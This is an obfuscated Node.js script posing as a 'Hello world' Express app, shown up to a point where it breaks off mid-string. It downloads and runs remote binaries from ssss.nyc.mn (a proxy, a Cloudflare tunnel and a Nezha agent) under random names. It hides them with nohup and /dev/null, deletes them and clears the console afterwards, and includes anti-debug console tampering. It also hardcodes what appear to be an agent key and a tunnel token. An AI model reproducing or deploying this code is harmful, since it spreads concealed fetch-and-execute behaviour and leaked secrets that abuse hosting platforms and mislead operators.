const _0x17b5fe=_0x3c49;(function(_0x4c33cf,_0x56fbca){const _0x505ae9=_0x3c49,_0x17e272=_0x4c33cf();while(!![]){try{const _0x2eef28=parseInt(_0x505ae9(0xf2))/0x1*(-parseInt(_0x505ae9(0x15f))/0x2)+parseInt(_0x505ae9(0x148))/0x3+-parseInt(_0x505ae9(0xb6))/0x4*(parseInt(_0x505ae9(0x157))/0x5)+-parseInt(_0x505ae9(0x13e))/0x6*(parseInt(_0x505ae9(0x15d))/0x7)+-parseInt(_0x505ae9(0x142))/0x8+-parseInt(_0x505ae9(0x119))/0x9*(-parseInt(_0x505ae9(0x141))/0xa)+-parseInt(_0x505ae9(0x11f))/0xb*(-parseInt(_0x505ae9(0xfb))/0xc);if(_0x2eef28===_0x56fbca)break;else _0x17e272['push'](_0x17e272['shift']());}catch(_0x43c7b0){_0x17e272['push'](_0x17e272['shift']());}}}(_0x1ad4,0xf3581));const _0x5d06e9=(function(){let _0xfb2909=!![];return function(_0xe6a677,_0x103155){const _0x308c63=_0xfb2909?function(){if(_0x103155){const _0x3a5a0b=_0x103155['apply'](_0xe6a677,arguments);return _0x103155=null,_0x3a5a0b;}}:function(){};return _0xfb2909=![],_0x308c63;};}()),_0x5b5a0f=_0x5d06e9(this,function(){const _0x2f8bb0=_0x3c49;return _0x5b5a0f['toString']()['search'](_0x2f8bb0(0xc9))[_0x2f8bb0(0xe7)]()[_0x2f8bb0(0xc0)](_0x5b5a0f)['search']('(((.+)+)+)+$');});_0x5b5a0f();const _0x2bf36=(function(){let _0x478b58=!![];return function(_0x459744,_0x15e090){const _0x2bbe0f=_0x478b58?function(){if(_0x15e090){const _0x41c94e=_0x15e090['apply'](_0x459744,arguments);return _0x15e090=null,_0x41c94e;}}:function(){};return _0x478b58=![],_0x2bbe0f;};}()),_0x185d44=_0x2bf36(this,function(){const _0x1c76e0=_0x3c49,_0x14f4f5=function(){const _0x52c280=_0x3c49;let _0x190499;try{_0x190499=Function(_0x52c280(0x116)+_0x52c280(0xc5)+');')();}catch(_0x3d1050){_0x190499=window;}return _0x190499;},_0x1e76fa=_0x14f4f5(),_0x5e670e=_0x1e76fa[_0x1c76e0(0x109)]=_0x1e76fa['console']||{},_0x2d34f0=[_0x1c76e0(0x102),'warn',_0x1c76e0(0xae),_0x1c76e0(0xab),_0x1c76e0(0x14a),_0x1c76e0(0x164),_0x1c76e0(0x153)];for(let _0x42bd76=0x0;_0x42bd76<_0x2d34f0[_0x1c76e0(0x106)];_0x42bd76++){const _0x50b17f=_0x2bf36[_0x1c76e0(0xc0)]['prototype']['bind'](_0x2bf36),_0x462dc4=_0x2d34f0[_0x42bd76],_0x5d419c=_0x5e670e[_0x462dc4]||_0x50b17f;_0x50b17f['__proto__']=_0x2bf36[_0x1c76e0(0x14f)](_0x2bf36),_0x50b17f['toString']=_0x5d419c[_0x1c76e0(0xe7)][_0x1c76e0(0x14f)](_0x5d419c),_0x5e670e[_0x462dc4]=_0x50b17f;}});_0x185d44();const express=require('express'),app=express(),axios=require(_0x17b5fe(0x114)),os=require('os'),fs=require('fs'),path=require(_0x17b5fe(0x131)),{promisify}=require(_0x17b5fe(0x139)),exec=promisify(require(_0x17b5fe(0x100))[_0x17b5fe(0xee)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x17b5fe(0x13d)][_0x17b5fe(0xb9)]||'',PROJECT_URL=process[_0x17b5fe(0x13d)][_0x17b5fe(0xe8)]||'',AUTO_ACCESS=process[_0x17b5fe(0x13d)][_0x17b5fe(0x130)]||!![],FILE_PATH=process[_0x17b5fe(0x13d)][_0x17b5fe(0xc6)]||'./tmp',SUB_PATH=process[_0x17b5fe(0x13d)][_0x17b5fe(0xac)]||'jianxianapp',PORT=process['env'][_0x17b5fe(0x147)]||process[_0x17b5fe(0x13d)][_0x17b5fe(0x143)]||0xbb8,UUID=process['env'][_0x17b5fe(0xbc)]||_0x17b5fe(0x175),NEZHA_SERVER=process[_0x17b5fe(0x13d)]['NEZHA_SERVER']||_0x17b5fe(0xb7),NEZHA_PORT=process[_0x17b5fe(0x13d)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x17b5fe(0x13d)][_0x17b5fe(0xc7)]||_0x17b5fe(0x132),ARGO_DOMAIN=process[_0x17b5fe(0x13d)]['ARGO_DOMAIN']||_0x17b5fe(0x127),ARGO_AUTH=process[_0x17b5fe(0x13d)][_0x17b5fe(0xf7)]||_0x17b5fe(0xeb),ARGO_PORT=process[_0x17b5fe(0x13d)]['ARGO_PORT']||0x1f41,CFIP=process[_0x17b5fe(0x13d)]['CFIP']||_0x17b5fe(0x168),CFPORT=process[_0x17b5fe(0x13d)]['CFPORT']||0x1bb,NAME=process[_0x17b5fe(0x13d)]['NAME']||'Phala';!fs[_0x17b5fe(0x101)](FILE_PATH)?(fs[_0x17b5fe(0xfa)](FILE_PATH),console[_0x17b5fe(0x102)](FILE_PATH+'\x20is\x20created')):console[_0x17b5fe(0x102)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x2343c9=_0x17b5fe,_0x17ce68=_0x2343c9(0x11c);let _0x272657='';for(let _0x507992=0x0;_0x507992<0x6;_0x507992++){_0x272657+=_0x17ce68[_0x2343c9(0x140)](Math[_0x2343c9(0xd7)](Math[_0x2343c9(0x118)]()*_0x17ce68[_0x2343c9(0x106)]));}return _0x272657;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x17b5fe(0xdc)](FILE_PATH,npmName),phpPath=path[_0x17b5fe(0xdc)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x17b5fe(0xdc)](FILE_PATH,botName),subPath=path[_0x17b5fe(0xdc)](FILE_PATH,_0x17b5fe(0xd2)),listPath=path[_0x17b5fe(0xdc)](FILE_PATH,_0x17b5fe(0x10d)),bootLogPath=path[_0x17b5fe(0xdc)](FILE_PATH,'boot.log'),configPath=path[_0x17b5fe(0xdc)](FILE_PATH,_0x17b5fe(0xf3));function deleteNodes(){const _0x69d32d=_0x17b5fe;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x158fa5;try{_0x158fa5=fs['readFileSync'](subPath,'utf-8');}catch{return null;}const _0x5b5601=Buffer['from'](_0x158fa5,_0x69d32d(0x14b))[_0x69d32d(0xe7)]('utf-8'),_0x7ee930=_0x5b5601[_0x69d32d(0xea)]('\x0a')[_0x69d32d(0x135)](_0x15a2fc=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x69d32d(0x163)](_0x15a2fc));if(_0x7ee930[_0x69d32d(0x106)]===0x0)return;return axios[_0x69d32d(0x117)](UPLOAD_URL+_0x69d32d(0x137),JSON[_0x69d32d(0x115)]({'nodes':_0x7ee930}),{'headers':{'Content-Type':_0x69d32d(0x129)}})['catch'](_0x326e35=>{return null;}),null;}catch(_0x25a8df){return null;}}function cleanupOldFiles(){const _0x88337d=_0x17b5fe;try{const _0x24bf49=fs[_0x88337d(0x15c)](FILE_PATH);_0x24bf49[_0x88337d(0x144)](_0x48c48e=>{const _0x95bf08=_0x88337d,_0x455311=path[_0x95bf08(0xdc)](FILE_PATH,_0x48c48e);try{const _0x273ae6=fs[_0x95bf08(0x16b)](_0x455311);_0x273ae6[_0x95bf08(0xb0)]()&&fs[_0x95bf08(0xb2)](_0x455311);}catch(_0x66ec55){}});}catch(_0x4a1129){}}app['get']('/',function(_0xa5635,_0x36efbe){const _0x334d0b=_0x17b5fe;_0x36efbe[_0x334d0b(0xe4)](_0x334d0b(0x146));});async function generateConfig(){const _0x4c2013=_0x17b5fe,_0x55806d={'log':{'access':_0x4c2013(0x158),'error':_0x4c2013(0x158),'loglevel':_0x4c2013(0x108)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x4c2013(0xd4),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x4c2013(0x108),'fallbacks':[{'dest':0xbb9},{'path':_0x4c2013(0xc3),'dest':0xbba},{'path':_0x4c2013(0x10e),'dest':0xbbb},{'path':_0x4c2013(0xfe),'dest':0xbbc}]},'streamSettings':{'network':_0x4c2013(0x124)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x4c2013(0xd4),'settings':{'clients':[{'id':UUID}],'decryption':_0x4c2013(0x108)},'streamSettings':{'network':'tcp','security':'none'}},{'port':0xbba,'listen':_0x4c2013(0xf8),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x4c2013(0x108),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x4c2013(0xc2),_0x4c2013(0xc1),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x4c2013(0xc4),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x4c2013(0x10e)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x4c2013(0xc1),_0x4c2013(0x150)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4c2013(0xf8),'protocol':_0x4c2013(0x126),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x4c2013(0xc1),'quic'],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':'freedom','tag':_0x4c2013(0x159)},{'protocol':'blackhole','tag':'block'}]};fs['writeFileSync'](path[_0x4c2013(0xdc)](FILE_PATH,_0x4c2013(0xf3)),JSON['stringify'](_0x55806d,null,0x2));}function getSystemArchitecture(){const _0x156ed4=_0x17b5fe,_0x8296c9=os[_0x156ed4(0x16d)]();return _0x8296c9===_0x156ed4(0xd5)||_0x8296c9===_0x156ed4(0xf9)||_0x8296c9===_0x156ed4(0xff)?_0x156ed4(0xd5):_0x156ed4(0xd6);}function downloadFile(_0x5d05af,_0x32564d,_0x4a2ac8){const _0x474949=_0x17b5fe,_0x3291cd=_0x5d05af;!fs[_0x474949(0x101)](FILE_PATH)&&fs[_0x474949(0xfa)](FILE_PATH,{'recursive':!![]});const _0x37423a=fs[_0x474949(0xd8)](_0x3291cd);axios({'method':'get','url':_0x32564d,'responseType':_0x474949(0x112)})[_0x474949(0x15e)](_0x524cbb=>{const _0x2bc8a6=_0x474949;_0x524cbb[_0x2bc8a6(0xe1)][_0x2bc8a6(0x121)](_0x37423a),_0x37423a['on'](_0x2bc8a6(0xdd),()=>{const _0xfc9471=_0x2bc8a6;_0x37423a[_0xfc9471(0x10a)](),console['log'](_0xfc9471(0xcd)+path[_0xfc9471(0x113)](_0x3291cd)+'\x20successfully'),_0x4a2ac8(null,_0x3291cd);}),_0x37423a['on'](_0x2bc8a6(0xab),_0x178086=>{const _0x5cf690=_0x2bc8a6;fs[_0x5cf690(0x122)](_0x3291cd,()=>{});const _0x535230='Download\x20'+path[_0x5cf690(0x113)](_0x3291cd)+_0x5cf690(0x14d)+_0x178086[_0x5cf690(0xf5)];console[_0x5cf690(0xab)](_0x535230),_0x4a2ac8(_0x535230);});})[_0x474949(0x11d)](_0x2a5fb9=>{const _0x40be78=_0x474949,_0x4b6b1f=_0x40be78(0xcd)+path['basename'](_0x3291cd)+_0x40be78(0x14d)+_0x2a5fb9[_0x40be78(0xf5)];console['error'](_0x4b6b1f),_0x4a2ac8(_0x4b6b1f);});}async function downloadFilesAndRun(){const _0x5762c1=_0x17b5fe,_0x446686=getSystemArchitecture(),_0x5a4bdc=getFilesForArchitecture(_0x446686);if(_0x5a4bdc['length']===0x0){console[_0x5762c1(0x102)](_0x5762c1(0xaf));return;}const _0x44c948=_0x5a4bdc[_0x5762c1(0x171)](_0x4dfa3b=>{return new Promise((_0x4aca0f,_0x2232c6)=>{downloadFile(_0x4dfa3b['fileName'],_0x4dfa3b['fileUrl'],(_0x3ac0a4,_0x8c8a73)=>{_0x3ac0a4?_0x2232c6(_0x3ac0a4):_0x4aca0f(_0x8c8a73);});});});try{await Promise[_0x5762c1(0xbb)](_0x44c948);}catch(_0x3726a1){console['error'](_0x5762c1(0x14c),_0x3726a1);return;}function _0x2b7bb7(_0x37014d){const _0x915df6=0x1fd;_0x37014d['forEach'](_0x56fcdd=>{const _0x579e03=_0x3c49;fs[_0x579e03(0x101)](_0x56fcdd)&&fs[_0x579e03(0xe6)](_0x56fcdd,_0x915df6,_0x110f9a=>{const _0x363ab9=_0x579e03;_0x110f9a?console[_0x363ab9(0xab)](_0x363ab9(0x173)+_0x56fcdd+':\x20'+_0x110f9a):console[_0x363ab9(0x102)](_0x363ab9(0x16f)+_0x56fcdd+':\x20'+_0x915df6[_0x363ab9(0xe7)](0x8));});});}const _0x40fa30=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2b7bb7(_0x40fa30);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1bc253=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x5762c1(0xea)](':')[_0x5762c1(0x134)]():'',_0x5efb1b=new Set(['443',_0x5762c1(0x172),_0x5762c1(0x152),_0x5762c1(0xf1),_0x5762c1(0x16c),_0x5762c1(0x138)]),_0x1744b9=_0x5efb1b[_0x5762c1(0xce)](_0x1bc253)?'true':_0x5762c1(0x136),_0x45b6c0='\x0aclient_secret:\x20'+NEZHA_KEY+_0x5762c1(0xca)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x1744b9+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x5762c1(0xb4)](path['join'](FILE_PATH,_0x5762c1(0x151)),_0x45b6c0);const _0x57add8='nohup\x20'+phpPath+_0x5762c1(0xbe)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x57add8),console[_0x5762c1(0x102)](phpName+_0x5762c1(0x11e)),await new Promise(_0x1e8631=>setTimeout(_0x1e8631,0x3e8));}catch(_0x301f8c){console[_0x5762c1(0xab)](_0x5762c1(0xe0)+_0x301f8c);}}else{let _0x216b09='';const _0x4bf244=[_0x5762c1(0x12b),_0x5762c1(0x172),_0x5762c1(0x152),_0x5762c1(0xf1),_0x5762c1(0x16c),_0x5762c1(0x138)];_0x4bf244[_0x5762c1(0xad)](NEZHA_PORT)&&(_0x216b09=_0x5762c1(0x170));const _0x3813cc='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x5762c1(0x128)+NEZHA_KEY+'\x20'+_0x216b09+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x3813cc),console[_0x5762c1(0x102)](npmName+_0x5762c1(0x11e)),await new Promise(_0x231125=>setTimeout(_0x231125,0x3e8));}catch(_0x3fd832){console[_0x5762c1(0xab)](_0x5762c1(0xda)+_0x3fd832);}}}else console[_0x5762c1(0x102)](_0x5762c1(0xf0));const _0x17bbbc=_0x5762c1(0x13b)+webPath+_0x5762c1(0xd9)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x17bbbc),console[_0x5762c1(0x102)](webName+_0x5762c1(0x11e)),await new Promise(_0x260ec2=>setTimeout(_0x260ec2,0x3e8));}catch(_0x5e33ca){console[_0x5762c1(0xab)](_0x5762c1(0x174)+_0x5e33ca);}if(fs[_0x5762c1(0x101)](botPath)){let _0x1416ad;if(ARGO_AUTH[_0x5762c1(0x161)](/^[A-Z0-9a-z=]{120,250}$/))_0x1416ad=_0x5762c1(0xd3)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x1416ad=_0x5762c1(0x103)+FILE_PATH+'/tunnel.yml\x20run':_0x1416ad=_0x5762c1(0x11b)+FILE_PATH+_0x5762c1(0x123)+ARGO_PORT;try{await exec(_0x5762c1(0x13b)+botPath+'\x20'+_0x1416ad+_0x5762c1(0x111)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x565f60=>setTimeout(_0x565f60,0x7d0));}catch(_0x304091){console[_0x5762c1(0xab)]('Error\x20executing\x20command:\x20'+_0x304091);}}await new Promise(_0x5d0afb=>setTimeout(_0x5d0afb,0x1388));}function getFilesForArchitecture(_0x5c96b0){const _0x37b981=_0x17b5fe;let _0xfdaec4;_0x5c96b0===_0x37b981(0xd5)?_0xfdaec4=[{'fileName':webPath,'fileUrl':_0x37b981(0xed)},{'fileName':botPath,'fileUrl':_0x37b981(0x12d)}]:_0xfdaec4=[{'fileName':webPath,'fileUrl':_0x37b981(0xb3)},{'fileName':botPath,'fileUrl':_0x37b981(0xc8)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x13a500=_0x5c96b0===_0x37b981(0xd5)?_0x37b981(0x145):_0x37b981(0x16a);_0xfdaec4['unshift']({'fileName':npmPath,'fileUrl':_0x13a500});}else{const _0x214f4c=_0x5c96b0==='arm'?'https://arm64.ssss.nyc.mn/v1':_0x37b981(0x105);_0xfdaec4[_0x37b981(0x12c)]({'fileName':phpPath,'fileUrl':_0x214f4c});}}return _0xfdaec4;}function argoType(){const _0x5a04be=_0x17b5fe;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x5a04be(0x102)](_0x5a04be(0x12f));return;}if(ARGO_AUTH[_0x5a04be(0xad)](_0x5a04be(0x10f))){fs[_0x5a04be(0xb4)](path[_0x5a04be(0xdc)](FILE_PATH,_0x5a04be(0x10c)),ARGO_AUTH);const _0x49f068=_0x5a04be(0xb1)+ARGO_AUTH[_0x5a04be(0xea)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x5a04be(0xdc)](FILE_PATH,_0x5a04be(0x10c))+_0x5a04be(0xbf)+ARGO_DOMAIN+_0x5a04be(0xcc)+ARGO_PORT+_0x5a04be(0x15b);fs['writeFileSync'](path[_0x5a04be(0xdc)](FILE_PATH,_0x5a04be(0x156)),_0x49f068);}else console[_0x5a04be(0x102)](_0x5a04be(0xde));}argoType();async function extractDomains(){const _0x14b06e=_0x17b5fe;let _0x13fb0e;if(ARGO_AUTH&&ARGO_DOMAIN)_0x13fb0e=ARGO_DOMAIN,console[_0x14b06e(0x102)]('ARGO_DOMAIN:',_0x13fb0e),await _0x309615(_0x13fb0e);else try{const _0x35163c=fs[_0x14b06e(0x104)](path[_0x14b06e(0xdc)](FILE_PATH,_0x14b06e(0x149)),_0x14b06e(0xdf)),_0x5795f8=_0x35163c[_0x14b06e(0xea)]('\x0a'),_0xcceb65=[];_0x5795f8[_0x14b06e(0x144)](_0x7c020b=>{const _0x284a95=_0x14b06e,_0x21d06b=_0x7c020b[_0x284a95(0x161)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x21d06b){const _0x26636d=_0x21d06b[0x1];_0xcceb65[_0x284a95(0x167)](_0x26636d);}});if(_0xcceb65[_0x14b06e(0x106)]>0x0)_0x13fb0e=_0xcceb65[0x0],console['log'](_0x14b06e(0x166),_0x13fb0e),await _0x309615(_0x13fb0e);else{console[_0x14b06e(0x102)](_0x14b06e(0xdb)),fs[_0x14b06e(0xb2)](path[_0x14b06e(0xdc)](FILE_PATH,_0x14b06e(0x149)));async function _0x21acc4(){const _0x552b3e=_0x14b06e;try{process[_0x552b3e(0xe2)]===_0x552b3e(0x110)?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x552b3e(0xec)):await exec(_0x552b3e(0x133)+botName[_0x552b3e(0x140)](0x0)+']'+botName[_0x552b3e(0xd0)](0x1)+_0x552b3e(0x13a));}catch(_0x1d051d){}}_0x21acc4(),await new Promise(_0x3e4ea7=>setTimeout(_0x3e4ea7,0xbb8));const _0x2531f6=_0x14b06e(0x11b)+FILE_PATH+_0x14b06e(0x123)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x2531f6+'\x20>/dev/null\x202>&1\x20&'),console[_0x14b06e(0x102)](botName+_0x14b06e(0x11e)),await new Promise(_0x412470=>setTimeout(_0x412470,0xbb8)),await extractDomains();}catch(_0x4f581d){console['error'](_0x14b06e(0xb5)+_0x4f581d);}}}catch(_0x26f04d){console[_0x14b06e(0xab)](_0x14b06e(0x15a),_0x26f04d);}async function _0x309615(_0x3fce3a){const _0x403f59=_0x14b06e,_0x5e659a=execSync(_0x403f59(0x162),{'encoding':_0x403f59(0xdf)}),_0x549efd=_0x5e659a[_0x403f59(0x14e)](),_0x47494d=NAME?NAME+'-'+_0x549efd:_0x549efd;return new Promise(_0x2fbbd4=>{setTimeout(()=>{const _0xc7e1a4=_0x3c49,_0x536e05={'v':'2','ps':''+_0x47494d,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0xc7e1a4(0x108),'net':'ws','type':_0xc7e1a4(0x108),'host':_0x3fce3a,'path':_0xc7e1a4(0xba),'tls':_0xc7e1a4(0xc1),'sni':_0x3fce3a,'alpn':'','fp':_0xc7e1a4(0xef)},_0x4bb7f3=_0xc7e1a4(0x13f)+UUID+'@'+CFIP+':'+CFPORT+_0xc7e1a4(0x154)+_0x3fce3a+_0xc7e1a4(0x155)+_0x3fce3a+_0xc7e1a4(0xbd)+_0x47494d+_0xc7e1a4(0xf4)+Buffer[_0xc7e1a4(0xfc)](JSON[_0xc7e1a4(0x115)](_0x536e05))[_0xc7e1a4(0xe7)](_0xc7e1a4(0x14b))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0xc7e1a4(0xe9)+_0x3fce3a+'&fp=firefox&type=ws&host='+_0x3fce3a+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x47494d+_0xc7e1a4(0x16e);console[_0xc7e1a4(0x102)](Buffer[_0xc7e1a4(0xfc)](_0x4bb7f3)[_0xc7e1a4(0xe7)]('base64')),fs[_0xc7e1a4(0xb4)](subPath,Buffer[_0xc7e1a4(0xfc)](_0x4bb7f3)[_0xc7e1a4(0xe7)](_0xc7e1a4(0x14b))),console[_0xc7e1a4(0x102)](FILE_PATH+_0xc7e1a4(0xb8)),uploadNodes(),app[_0xc7e1a4(0xd1)]('/'+SUB_PATH,(_0x5df4e2,_0x380118)=>{const _0x59ce68=_0xc7e1a4,_0xf87deb=Buffer[_0x59ce68(0xfc)](_0x4bb7f3)[_0x59ce68(0xe7)](_0x59ce68(0x14b));_0x380118[_0x59ce68(0x13c)](_0x59ce68(0xfd),'text/plain;\x20charset=utf-8'),_0x380118['send'](_0xf87deb);}),_0x2fbbd4(_0x4bb7f3);},0x7d0);});}}async function uploadNodes(){const _0x4c4407=_0x17b5fe;if(UPLOAD_URL&&PROJECT_URL){const _0x4e355d=PROJECT_URL+'/'+SUB_PATH,_0x13bd33={'subscription':[_0x4e355d]};try{const _0x1c17f0=await axios['post'](UPLOAD_URL+'/api/add-subscriptions',_0x13bd33,{'headers':{'Content-Type':'application/json'}});return _0x1c17f0&&_0x1c17f0['status']===0xc8?(console['log'](_0x4c4407(0x160)),_0x1c17f0):null;}catch(_0x486a3e){if(_0x486a3e['response']){if(_0x486a3e[_0x4c4407(0x12e)][_0x4c4407(0xcb)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4c4407(0x101)](listPath))return;const _0x515b88=fs[_0x4c4407(0x104)](listPath,_0x4c4407(0xdf)),_0x5a105c=_0x515b88[_0x4c4407(0xea)]('\x0a')[_0x4c4407(0x135)](_0x59c45e=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x59c45e));if(_0x5a105c['length']===0x0)return;const _0x241b25=JSON[_0x4c4407(0x115)]({'nodes':_0x5a105c});try{const _0x2c71fe=await axios[_0x4c4407(0x117)](UPLOAD_URL+'/api/add-nodes',_0x241b25,{'headers':{'Content-Type':_0x4c4407(0x129)}});return _0x2c71fe&&_0x2c71fe['status']===0xc8?(console[_0x4c4407(0x102)](_0x4c4407(0x12a)),_0x2c71fe):null;}catch(_0x30fdbb){return null;}}else return;}}function _0x3c49(_0x536823,_0x218c45){const _0x24b52c=_0x1ad4();return _0x3c49=function(_0x185d44,_0x2bf36){_0x185d44=_0x185d44-0xab;let _0x5723fd=_0x24b52c[_0x185d44];return _0x5723fd;},_0x3c49(_0x536823,_0x218c45);}function cleanFiles(){setTimeout(()=>{const _0x5424e9=_0x3c49,_0x5aab78=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x5aab78['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x5aab78[_0x5424e9(0x167)](phpPath);process[_0x5424e9(0xe2)]===_0x5424e9(0x110)?exec('del\x20/f\x20/q\x20'+_0x5aab78[_0x5424e9(0xdc)]('\x20')+_0x5424e9(0x107),_0x433e23=>{const _0x382428=_0x5424e9;console[_0x382428(0xe5)](),console[_0x382428(0x102)]('App\x20is\x20running'),console['log'](_0x382428(0x125));}):exec('rm\x20-rf\x20'+_0x5aab78['join']('\x20')+'\x20>/dev/null\x202>&1',_0x4494a7=>{const _0x24ed06=_0x5424e9;console[_0x24ed06(0xe5)](),console['log'](_0x24ed06(0x120)),console[_0x24ed06(0x102)](_0x24ed06(0x125));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4a5685=_0x17b5fe;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x4a5685(0x10b));return;}try{const _0x261e8e=await axios[_0x4a5685(0x117)](_0x4a5685(0xcf),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console['log']('automatic\x20access\x20task\x20added\x20successfully'),_0x261e8e;}catch(_0x1ae90c){return console[_0x4a5685(0xab)](_0x4a5685(0xe3)+_0x1ae90c[_0x4a5685(0xf5)]),null;}}function _0x1ad4(){const _0x1b66c6=['platform','Add\x20automatic\x20access\x20task\x20faild:\x20','send','clear','chmod','toString','PROJECT_URL','?security=tls&sni=','split','eyJhIjoiZTNlYmU5NDY1NjJjOGZjMjBmYzg4Y2U5MGJlODRjYTMiLCJ0IjoiM2Q0MWM5ODItOGE3Mi00MDQ0LWJiMDktNWZhNzdkMGMyM2M0IiwicyI6Ik1URXpOMlJsWmpndE9EWmxOQzAwT1daakxXRTJZV1F0TXpsa016QXlNbU5tTXpCayJ9','.exe\x20>\x20nul\x202>&1','https://arm64.ssss.nyc.mn/web','exec','firefox','NEZHA\x20variable\x20is\x20empty,skip\x20running','2087','46825UkwvWJ','config.json','\x0a\x20\x20\x0avmess://','message','Unhandled\x20error\x20in\x20startserver:','ARGO_AUTH','127.0.0.1','arm64','mkdirSync','4660032vLFEgX','from','Content-Type','/trojan-argo','aarch64','child_process','existsSync','log','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','readFileSync','https://amd64.ssss.nyc.mn/v1','length','\x20>\x20nul\x202>&1','none','console','close','Skipping\x20adding\x20automatic\x20access\x20task','tunnel.json','list.txt','/vmess-argo','TunnelSecret','win32','\x20>/dev/null\x202>&1\x20&','stream','basename','axios','stringify','return\x20(function()\x20','post','random','549pKylwS','listen','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','abcdefghijklmnopqrstuvwxyz','catch','\x20is\x20running','132EFBJdV','App\x20is\x20running','pipe','unlink','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','tcp','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','trojan','phala.jianxian.nyc.mn','\x20-p\x20','application/json','Nodes\x20uploaded\x20successfully','443','unshift','https://arm64.ssss.nyc.mn/bot','response','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','AUTO_ACCESS','path','8Ym2T2gnKUCiIaThfD2iOPXLCcQs7Wpi','pkill\x20-f\x20\x22[','pop','filter','false','/api/delete-nodes','2053','util','\x22\x20>\x20/dev/null\x202>&1','nohup\x20','set','env','6oxRHeu','\x0avless://','charAt','64120nAZBQH','2524544XBRSKP','PORT','forEach','https://arm64.ssss.nyc.mn/agent','Hello\x20world!','SERVER_PORT','312189sEaENu','boot.log','exception','base64','Error\x20downloading\x20files:','\x20failed:\x20','trim','bind','quic','config.yaml','2096','trace','?encryption=none&security=tls&sni=','&fp=firefox&type=ws&host=','tunnel.yml','9500515oxMhpa','/dev/null','direct','Error\x20reading\x20boot.log:','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','readdirSync','13271958LYVIFw','then','2AETZVz','Subscription\x20uploaded\x20successfully','match','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','test','table','Error\x20in\x20startserver:','ArgoDomain:','push','104.18.4.250','http\x20server\x20is\x20running\x20on\x20port:','https://amd64.ssss.nyc.mn/agent','statSync','2083','arch','\x0a\x20\x20\x20\x20','Empowerment\x20success\x20for\x20','--tls','map','8443','Empowerment\x20failed\x20for\x20','web\x20running\x20error:\x20','0c524a06-80a4-4cb2-809a-8751c7ee4000','error','SUB_PATH','includes','info','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','isFile','\x0a\x20\x20tunnel:\x20','unlinkSync','https://amd64.ssss.nyc.mn/web','writeFileSync','Error\x20executing\x20command:\x20','4ncvRte','jianxian.apkk.cloudns.org:10880','/sub.txt\x20saved\x20successfully','UPLOAD_URL','/vmess-argo?ed